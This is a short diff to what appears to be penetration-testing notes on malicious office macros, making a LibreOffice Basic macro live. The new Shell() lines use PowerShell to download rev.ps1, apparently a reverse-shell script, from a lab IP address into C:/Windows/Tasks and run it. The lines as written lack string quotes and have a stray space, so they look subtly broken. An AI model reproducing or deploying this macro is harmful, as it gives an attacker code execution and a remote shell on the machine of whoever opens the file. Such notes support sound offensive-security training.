@@ -577,13 +577,12 @@ Microsoft Office applications like Word and Excel allow users to embed macros, a
 Tools > Macros > Organize Macros > Basic
 New
 Enter These commands:
+
 REM  *****  BASIC  *****
 
 Sub MyMacro()
-'
-' cmd /c powershell iwr http://<your ip>/rev.ps1 - o C:/Windows/Tasks/rev.ps1
-' cmd /c powershell -c C:/Windows/Tasks/rev.ps1
-'
+	Shell(cmd /c powershell iwr http://192.168.119.140/rev.ps1 - o C:/Windows/Tasks/rev.ps1)
+	Shell(cmd /c powershell -c C:/Windows/Tasks/rev.ps1)
 End Sub
 ````
 ````
